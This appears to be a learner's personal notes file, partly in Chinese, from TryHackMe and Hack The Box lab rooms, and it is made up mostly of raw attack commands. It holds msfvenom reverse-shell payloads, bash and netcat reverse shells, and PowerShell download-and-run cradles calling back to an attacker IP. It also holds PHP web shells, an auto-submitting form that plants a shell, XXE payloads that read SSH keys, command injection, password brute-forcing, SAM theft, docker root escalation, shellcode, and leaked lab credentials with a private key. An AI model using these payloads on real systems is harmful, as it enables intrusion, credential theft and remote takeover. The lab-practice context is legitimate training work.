0030   80 18 00 40 ae bb 00 00 01 01 08 0a 2a f3 87 ed   ...@........*...
0040   2a f3 59 fe 70 79 74 68 6f 6e 20 2d 63 20 22 69   *.Y.python -c "i
0050   6d 70 6f 72 74 20 70 74 79 3b 70 74 79 2e 73 70   mport pty;pty.sp
0060   61 77 6e 28 27 2f 62 69 6e 2f 62 61 73 68 27 29   awn('/bin/bash')
0070   22 0a                                             ".


python -c "import pty;pty.spawn('/bin/bash')"

TELCOMMU ATIO NCODI 1G

LS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0KLS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLi0tLS0KLS0tLS0gLS0tLS0gLi0tLS0gLS0tLS0gLS0tLS0gLS

zip package.rar

http://10.10.209.5/index.php

gobuster dir -u http://10.10.9.82 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

http://10.10.226.6/

gobuster dir -u http://10.10.226.6/-w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

This_is_Not_a_Flag_This_is_Not_a_Flag_This_is_Not_a_Flag_This_is_Not_a_Flag_This_is_Not_a_Flag_This_is_Not_a_Flag

Go to packet number 39765
Look at the "packet details pane". Right-click on the JPEG section and "Export packet bytes". This is an alternative way of extracting data from a capture file. What is the MD5 hash value of extracted image?


msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.72.135 LPORT=1234 -f exe -o reverse-shell.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.72.135 LPORT=4444 -f exe -o reverse-root.exe

copy \\10.11.72.135\kali\reverse-shell.exe C:\PrivEsc\reverse-shell.exe

copy \\10.11.72.135\kali\reverse-root.exe C:\PrivEsc\reverse-root.exe

winexe -U 'admin%password123' //10.10.114.178 cmd.exe

runas /savecred /user:admin C:\PrivEsc\reverse-root.exe

copy C:\Windows\Repair\SAM \\10.11.72.135\kali\

copy C:\Windows\Repair\SYSTEM \\10.11.72.135\kali\

echo C:\PrivEsc\reverse-root.exe >> C:\DevTools\CleanUp.ps1

Warning: include(dog1.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'dog1.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24

gobuster dir -u http://10.10.30.71/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

HTB{1_4m_7h3_53r14l_g3n3r470r!}

curl -X POST http://94.237.63.83:58467/serial.php -d "serial=7h15_15_a_s3cr37_m3554g3"

7h15_15_a_s3cr37_m3554g3

N2gxNV8xNV9hX3MzY3IzN19tMzU1NGcz 

-d "serial=7h15_15_a_s3cr37_m3554g3"

HTB{n3v3r_run_0bfu5c473d_c0d3!}

function apiKeys()
	{
	var flag='HTB
		{
		n'+'3v3r_'+'run_0'+'bfu5c'+'473d_'+'c0d3!'+'
	}
	',xhr=new XMLHttpRequest(),_0x437f8b='/keys'+'.php';
	xhr['open']('POST',_0x437f8b,!![]),xhr['send'](null)
}
console['log']('HTB
	{
	j'+'4v45c'+'r1p7_'+'3num3'+'r4710'+'n_15_'+'k3y
}
');

curl http://94.237.53.3:49992/keys.php -X POST

4150495f70336e5f37333537316e365f31355f66756e

echo 4150495f70336e5f37333537316e365f31355f66756e | xxd -p -r

echo ENCODED_HEX | xxd -p -r

API_p3n_73571n6_15_fun

curl http://94.237.53.3:49992/keys.php -X POST -d "key=API_p3n_73571n6_15_fun"


powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.72.135:1234/ Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.72.135 -Port 4444

msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.72.135 LPORT=5555 -f exe -o shell-name.exe

powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.72.135:1234/shell-name.exe','shell-name.exe')"

ERROR: Invalid username.

ERROR: Invalid username. Lost your password?

POST /wp-login.php

log=admin&pwd=admin&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1

hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -f 10.10.252.156 -s 80 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:ERROR: Invalid username."

wpscan --url http://10.10.252.156/ -u hugo,philip,c0ldd -P /usr/share/wordlists/rockyou.txt


<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.11.72.135/1234 0>&1'");
?>

cybersecurity

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.72.135 LPORT=1234 -f war -o shell.war

java/jsp_shell_reverse_tcp

echo "bash -i >& /dev/tcp/10.11.72.135/4444 0>&1" >> id.sh

gobuster dir -u http://10.10.216.105/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

sudo nmap -Pn -A 10.10.216.105

msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.11.72.135 LPORT=1234 -f exe -o reversh.exe

wget http://10.11.72.135:9000/reversh.exe

powershell -c "Invoke-WebRequest -Uri 'http://10.11.72.135:8000/reversh.exe' -OutFile 'c:\Program Files (x86)\SystemScheduler\reversh.exe'"

powershell -c "Invoke-WebRequest -Uri 'http://10.11.72.135:8000/reversh.exe' -OutFile 'C:\Winodws\system32\inetsrv\reversh.exe'"

C:\Windows\Temp\win.bat

powershell -c "Invoke-WebRequest -Uri 'http://10.11.72.135:8000/win.bat' -OutFile 'c:\Winodws\temp\win.bat'"


## 每日号角

spiderman

3.7.0


Jonah
spiderman123

Joomla

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.11.72.135/1234 0>&1'");?>

mysql -h localhost -u root -p nv5uz9r3ZEDzVjNu



## HTB演练房间

curl -X POST  -b 'PHPSESSID=in4hbkukn0m66sh7dvg70ubtj7' -H 'Content-Type:application/json' http://94.237.63.93:59800/api.php/city/london

curl http://94.237.63.93:59800/api.php/city/london

curl -X PUT -H 'Content-Type:application/json' -d '{"city_name":"flag", "country_name":"HTB"}' http://94.237.63.93:59800/api.php/city/london

curl -X DELETE -H 'Content-Type:application/json' http://94.237.63.93:59800/api.php/city/flag

curl -X POST -d '{"search":"flag"}' -H 'Content-Type:application/json' http://94.237.63.93:59800/

## windows privesc

xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.14.254

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.72.135 LPORT=1234 -f exe -o reverse-shell.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.72.135 LPORT=4444 -f exe -o reverse-root.exe

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .

copy \\10.11.72.135\kali\reverse-shell.exe C:\PrivEsc\reverse-shell.exe

copy \\10.11.72.135\kali\reverse-root.exe C:\PrivEsc\reverse-root.exe

C:\PrivEsc\reverse-shell.exe

C:\PrivEsc\reverse-root.exe

copy C:\Windows\Repair\SAM \\10.11.72.135\kali\

copy C:\Windows\Repair\SYSTEM \\10.11.72.135\kali\

echo C:\PrivEsc\reverse-root.exe >> C:\DevTools\CleanUp.ps1

accesschk.exe 检查某个账户对某个服务的权限

C:\PrivEsc\RoguePotato.exe -r 10.11.72.135 -e "C:\PrivEsc\reverse-root.exe" -l 9999


## 忍者技能

8V2L zhaodoale
bny0
/mnt c4ZX
/mnt D8B3 best-group
/var FHl1 na nsha1 ner
/opt oiMO
/opt PFbD
/media rmfX
/etc/ssh SRSq
/var/log uqyw
/etc v2Vb best-group nsha1 ner
/home X1Uy na nsha1 ner 

find / -name "bny0"

find / -type f \( -name 8V2L -o -name bny0 -o -name c4ZX -o -name D8B3 -o -name FHl1 -o -name oiM0 -o -name PFbD -o -name rmfX -o -name SRSq -o -name uqyw -o -name v2Vb -o -name X1Uy \) 2>/dev/null

-exec grep -E -o “([0–9]{1,3}[\.]){3}[0–9]{1,3}”

find / -type f \( -name 8V2L -o -name bny0 -o -name c4ZX -o -name D8B3 -o -name FHl1 -o -name oiM0 -o -name PFbD -o -name rmfX -o -name SRSq -o -name uqyw -o -name v2Vb -o -name X1Uy \)

sha1sum

ls -l 

wc -l



## 大天使

support@mafialive.thm

curl -s http://10.10.134.250/ | grep ".thm

gobuster dir -u http://10.10.134.250/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

操太难了，先放弃

## 穆斯塔基奥

john --wordlist=/usr/share/wordlists/rockyou.txt user.txt

PORT     STATE SERVICE
8765/tcp open  ultraseek-http

admin:bulldog19

Example=/auth/dontforget.bak

该房间涉及XXE,看教程完成XXE部分



XXE payload:  
``````
<?xml version=”1.0" encoding=”UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM ‘file:///home/barry/.ssh/id_ssh’>]>
<comment>
<name>Joe Hamd</name>
<author>Barry Clad</author>
<com>&test;</com>
</comment>
``````

<?xml version=”1.0" encoding=”UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM ‘file:///home/barry/.ssh/id_rsa’>]>
<comment>
<name>Joe Hamd</name>
<author>Barry Clad</author>
<com>&test;</com>
</comment>



<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY name SYSTEM "file:///home/barry/.ssh/known_hosts" >]>
<comment>
  <name>&name;</name>
  <author>Pavandeep</author>
  <com>Hacking Articles</com>
</comment>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY name SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
<comment>
  <name>&name;</name>
  <author>Pavandeep</author>
  <com>Hacking Articles</com>
</comment>



Name: root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false 
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false 
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false 
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false 
lxd:x:106:65534::/var/lib/lxd/:/bin/false 
messagebus:x:107:111::/var/run/dbus:/bin/false 
uuidd:x:108:112::/run/uuidd:/bin/false 
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false 
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin 
pollinate:x:111:1::/var/cache/pollinate:/bin/false 
joe:x:1002:1002::/home/joe:/bin/bash 
barry:x:1003:1003::/home/barry:/bin/bash

-----BEGIN RSA PRIVATE KEY----- 
D137279D69A43E71BB7FCB87FC61D25E jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65 l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk 4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8 7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+ T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7 LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF 6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs 7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of 1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ +Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn 7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----

这个房间的id_rsa文件没办法用ssh2john和john解码，卡关了，先放弃。

## 连宇

该房间三次借助wp的帮助，第一次需要对island爆破目录，以及对2100的爆破，第二次需要找到乱码的加密方式，第三次需要知道另一个用户[],以及使用stegseek对aa.jpg文件密码的爆破

gobuster dir -u http://10.10.182.66/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

10.10.182.66

 The Code Word is: 
                                                           
barry@10.10.101.85's password: 
vigilante


/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

/SecLists-master/Discovery/

gobuster dir -u http://10.10.101.85/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

gobuster dir -u http://10.10.101.85/island/2100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

token:  

This is just a token to get into Queen's Gambit(Ship)

RTy8yhBQdscX
Queen'sGambit

!#th3h00d

stegseek -sf aa.jpg /usr/share/wordlists/rockyou.txt


user:slade
passwd:m3tahuman

slade密码：M3tahuman

提权非常简单

## windows持久性


python secretdump.py -sam sam.bak -system system.bak LOCAL

thon3 secretsdump.py [domain/]username[:password] -t THREADS -inputfile INPUTFILE [options]

## 缓冲区溢出

7650040000000000&1111111111111
765004000000000

11111111111111

11111111111111765004000000000

111111111111117650040000000000

0000000000400567 <special>:
  400567:       55                      push   %rbp
  400568:       48 89 e5                mov    %rsp,%rbp
  40056b:       bf 80 06 40 00          mov    $0x400680,%edi
  400570:       e8 eb fe ff ff          callq  400460 <puts@plt>
  400575:       bf 9d 06 40 00          mov    $0x40069d,%edi
  40057a:       e8 e1 fe ff ff          callq  400460 <puts@plt>
  40057f:       90                      nop
  400580:       5d                      pop    %rbp
  400581:       c3                      retq   

2850040000000000

0000000000400582 <normal>:
  400582:       55                      push   %rbp
  400583:       48 89 e5                mov    %rsp,%rbp
  400586:       bf b3 06 40 00          mov    $0x4006b3,%edi
  40058b:       e8 d0 fe ff ff          callq  400460 <puts@plt>
  400590:       90                      nop
  400591:       5d                      pop    %rbp
  400592:       c3                      retq   

3950040000000000
0000000000400593 <other>:
  400593:       55                      push   %rbp
  400594:       48 89 e5                mov    %rsp,%rbp
  400597:       bf cf 06 40 00          mov    $0x4006cf,%edi
  40059c:       b8 00 00 00 00          mov    $0x0,%eax
  4005a1:       e8 ca fe ff ff          callq  400470 <printf@plt>
  4005a6:       90                      nop
  4005a7:       5d                      pop    %rbp
  4005a8:       c3                      retq  

  python -c 'print "A" * 14 + "\x67\x05\x40"' | ./func-pointer

  \x67\x05\x40是地址

python -c 'print "A" * 14 + "\x82\x05\x40"' | ./func-pointer

python -c 'print "A" * 14 + "\x93\x05\x40"' | ./func-pointer

python -c “print(‘\x90’ * 30 + ‘\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05’ +

‘\x41’ * 60 + 

‘\xef\xbe\xad\xde’) | ./program_name

 ”

python -c print('\x90' * 30 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + '\x41' * 60 + '\xef\xbe\xad\xde')' | ./buffer-overflow

python -c "print('\x90' * 30 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + '\x41' * 60 + '\xef\xbe\xad\xde')" | ./buffer-overflow


python -c "print('\x90' * 30 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + '\x41' * 60 + '\xef\xbe\xad\xde') | ./buffer-overflow"

python -c "print('\x90' * 30 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + '\x41' * 60 + '\xef\xbe\xad\xde')" | ./buffer-overflow

这个房间没结束

## 不透明度

gobuster dir -u http://10.10.104.191/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

smb或samba共享

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.104.191


/cloud

文件上传

## 赛博降临 3 (2021)


>第二天

{company: "The Best Festival Company", isregistered:"True", username:"test"}

## 懒惰管理员

三次参考WP
第一次找到文件changelog.txt
第二次找到用户名manager（其实是密码Password123输成了password123导致登陆不进去）
第三次提权，但是已经有想法了，但没实践，更改copy.sh文件的内容，把IP改成攻击机的IP

gobuster dir -u http://10.10.126.250/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt.html

<script>window.park = "eyJ1dWlkIjoiMzQ5ZTYzMjMtZTgwNy00YmMxLWFjNzItZThmMWM4Mzk4YmY1IiwicGFnZV90aW1lIjoxNzEzMDgwNDg0LCJwYWdlX3VybCI6Imh0dHA6Ly93dzI1LmJhc2ljLWNtcy5vcmcvZG9jcy81LXRoaW5ncy1uZWVkLXRvLWJlLWRvbmUtd2hlbi1Td2VldFJpY2UtaW5zdGFsbGVkLz9zdWJpZDE9MjAyNDA0MTQtMTc0MS0xODk5LWIxNzAtYzRiOTRjNDg3YjIxIiwicGFnZV9tZXRob2QiOiJHRVQiLCJwYWdlX3JlcXVlc3QiOnsic3ViaWQxIjoiMjAyNDA0MTQtMTc0MS0xODk5LWIxNzAtYzRiOTRjNDg3YjIxIn0sInBhZ2VfaGVhZGVycyI6eyJyZWZlcmVyIjpbImh0dHA6Ly8xMC4xMC4xMjYuMjUwLyJdfSwiaG9zdCI6Ind3MjUuYmFzaWMtY21zLm9yZyIsImlwIjoiMTE0LjIyMS4xLjYifQo=";</script>



manager:Password123



http://localhost/sweetrice/inc/ads/hacked.php

<html>
<body onload="document.exploit.submit();">
<form action="http://localhost/sweetrice/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="hacked"/>
<textarea type="hidden" name="adv">
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.11.72.135/1234 0>&1'");
phpinfo();?>
&lt;/textarea&gt;
</form>
</body>
</html>

echo "#!/bin/bash 
bash -i >& /dev/tcp/10.11.72.135/4444 0>&1" > copy.sh

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.72.135 5554 >/tmp/f" > copy.sh

## 博客

gobuster dir -u http://10.10.38.168/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

smb匿名帐户无法登录

smbclient //IP/anonymous

目录爆破结果：  
/rss                  (Status: 301) [Size: 0] [--> http://10.10.38.168/feed/]
/login                (Status: 302) [Size: 0] [--> http://blog.thm/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.10.38.168/0/]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.38.168/feed/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.38.168/feed/atom/]
/wp-content           (Status: 301) [Size: 317] [--> http://10.10.38.168/wp-content/]
/admin                (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.38.168/feed/]
/wp-includes  

/rdf                  (Status: 301) [Size: 0] [--> http://10.10.38.168/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> http://10.10.38.168/]
/'                    (Status: 301) [Size: 0] [--> http://10.10.38.168/]
/dashboard            (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]
/%20                  (Status: 301) [Size: 0] [--> http://10.10.38.168/]
/2020                 (Status: 301) [Size: 0] [--> http://10.10.38.168/2020/]
/wp-admin             (Status: 301) [Size: 315] [--> http://10.10.38.168/wp-admin/]
/0000                 (Status: 301) [Size: 0] [--> http://10.10.38.168/0000/]
/embed                (Status: 301) [Size: 0] [--> http://10.10.38.168/embed/]

太尼玛难了，先跑路了

## 超泰克

从找到/auth往后基本参照wp写:
找到/js/api.js代码里的命令注入
命令注入后找到数据库文件
通过数据库文件找到两个用户名和密码（自己做的）
ssh登录（自己做的）
通过docker提权

ports: 
21
22
8081
31331

对31331端口页面的扫描
/images               (Status: 301) [Size: 322] [--> http://10.10.87.228:31331/images/]
/css                  (Status: 301) [Size: 319] [--> http://10.10.87.228:31331/css/]
/js                   (Status: 301) [Size: 318] [--> http://10.10.87.228:31331/js/]
/javascript           (Status: 301) [Size: 326] [--> http://10.10.87.228:31331/javascript/]

对8081端口的扫描：
/auth
/ping
UltraTech API v0.1.3

You must specify a login and a password
以下根据wp做出：
/js/api.js
``````
function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
``````
http://10.10.87.228:8081/ping?ip=`ls`

ping: utech.db.sqlite: Name or service not known

curl 'http://10.10.87.228:8081/ping?ip=`cat%20utech.db.sqlite`'

curl 

r00tf357a0c52799563c7c7b76c1e7543a32Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded

(r00tf357a0c52799563c7c7b76c1e7543a32)admin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded
以上wp
0d0ea5111e3c1def594c1684e3b9be84:mrsheafy

f357a0c52799563c7c7b76c1e7543a32:n100906

curl -i "http://10.10.87.228:8081/auth?login=admin&password=mrsheafy"

r00t有116的docker权限：

CONTAINER_ID="$(docker run -d alpine)"  # or existing
TF=$(/root/.ssh/id_rsa)
docker cp file_to_read $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF $TF
cat $TF

配置文件

docker run -v /:/mnt --rm -it alpine chroot /mnt sh

docker run -v /:/mnt --rm -it bash chroot /mnt sh 

docker提权


## 猫图片

user

/images               (Status: 301) [Size: 241] [--> http://10.10.192.207:8080/images/]
/download             (Status: 301) [Size: 243] [--> http://10.10.192.207:8080/download/]
/feed                 (Status: 200) [Size: 1471]
/language             (Status: 301) [Size: 243] [--> http://10.10.192.207:8080/language/]
/ext                  (Status: 301) [Size: 238] [--> http://10.10.192.207:8080/ext/]

/adm                  (Status: 301) [Size: 238] [--> http://10.10.192.207:8080/adm/]


/feed
ttp://10.10.192.207:8080/app.php/feed
http://10.10.192.207:8080/viewtopic.php?t=2&amp;p=2#p2
http://10.10.192.207:8080/memberlist.php?mode=viewprofile&amp;u=2

没做完，注册很麻烦。

## wireshark 
Go to packet number 39765
Look at the "packet details pane". Right-click on the JPEG section and "Export packet bytes". This is an alternative way of extracting data from a capture file. What is the MD5 hash value of extracted image?


TryHackMe_Wireshark_Demo 

\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31 \xd2\xb0\x3b\x0f\x05


## 国歌

80
3389

/search               (Status: 200) [Size: 3418]
/blog                 (Status: 200) [Size: 5394]
/rss                  (Status: 200) [Size: 1873]
/sitemap              (Status: 200) [Size: 1041]
/archive              (Status: 301) [Size: 123] [--> /blog/]
/categories           (Status: 200) [Size: 3541]
/authors              (Status: 200) [Size: 4115]
/Search               (Status: 200) [Size: 3468]
/tags                 (Status: 200) [Size: 3594]
/install              (Status: 302) [Size: 126] [--> /umbraco/]
/RSS                  (Status: 200) [Size: 1873]
/Blog                 (Status: 200) [Size: 5394]
/Archive              (Status: 301) [Size: 123] [--> /blog/]
/SiteMap              (Status: 200) [Size: 1041]


http://10.10.195.69/blog/ 2020-04-05T20:37:17+00:00 
http://10.10.195.69/archive/ 2020-04-05T19:11:38+00:00 
http://10.10.195.69/archive/we-are-hiring/ 2020-04-05T21:01:02+00:00 
http://10.10.195.69/archive/a-cheers-to-our-it-department/ 2020-04-05T21:02:29+00:00 
http://10.10.195.69/authors/ 2020-04-05T23:13:00+00:00 
http://10.10.195.69/authors/jane-doe/ 2020-04-05T21:11:16+00:00


SG@anthem.com

UmbracoIsTheBest!

网不好，先跑路了

## 

地址,Port,分组,Bytes,Total Packets,Percent Filtered,Tx Packets,Tx Bytes,Rx Packets,Rx Bytes
"Xerox_00:00:00","0",43,25091,0,0,20,2323,23,22768
"fe:ff:20:00:01:00","0",43,25091,0,0,23,22768,20,2323
"Micro-St_9a:f1:f5","0",10478,7474293,0,0,4294,1083687,6184,6390606
"Sophos_15:f9:80","0",10421,7466315,0,0,6170,6389056,4251,1077259
"IPv4mcast_7f:ff:fa","0",22,3739,0,0,0,0,22,3739
"Broadcast","0",81,18457,0,0,0,0,81,18457
"IPv4mcast_fc","0",4,256,0,0,0,0,4,256
"QuantaCo_51:4f:a9","0",2339,1219700,0,0,1111,187870,1228,1031830
"Sophos_10:ad:30","0",2307,1215341,0,0,1228,1031830,1079,183511
"PcsCompu_cc:3f:1b","0",1444,522538,0,0,636,111240,808,411298
"RealtekU_12:35:02","0",1412,519626,0,0,808,411298,604,108328
"RealtekU_12:35:03","0",30,2426,0,0,0,0,30,2426
"IBM_6b:72:00","0",16,1968,0,0,6,558,10,1410
"LexmarkP_81:81:d0","0",16,1952,0,0,8,992,8,960
"Apple_13:c5:58","0",33,3180,0,0,18,1650,15,1530
"MS-NLB-PhysServer-26_11:f0:c8:3b","0",33,3180,0,0,15,1530,18,1650
"LCFCHeFe_ce:28:5f","0",8571,844714,0,0,4678,341398,3893,503316
"zte_2e:f0:5e","0",8527,831465,0,0,3894,503490,4633,327975
"XeroxXer_bb:cc:ff","0",44,2640,0,0,44,2640,0,0
"MAC-specific-ctrl-proto-01","0",44,2640,0,0,0,0,44,2640
"IPv6mcast_01","0",1,174,0,0,0,0,1,174
"02:c8:85:b5:5a:aa","0",58542,110205282,0,0,28971,2417591,29571,107787691
"02:45:a3:b1:8c:f1","0",58575,110215407,0,0,29590,107790055,28985,2425352
"02:46:92:ec:ed:bd","0",32,9973,0,0,16,7845,16,2128
"IPv6mcast_fb","0",1,107,0,0,0,0,1,107
"IPv4mcast_fb","0",1,87,0,0,0,0,1,87

qii

echo "10.129.201.123 app.inlanefreight.local dev.inlanefreight.local" >> /etc/hosts


## 回望
10.10.218.23

sudo nmap --min-rate 10000 10.10.218.23

Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-24 15:44 CST
Nmap scan report for 10.10.218.23
Host is up (0.36s latency).

PORT     STATE    SERVICE        VERSION
80/tcp   open     http           Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-IIS/10.0
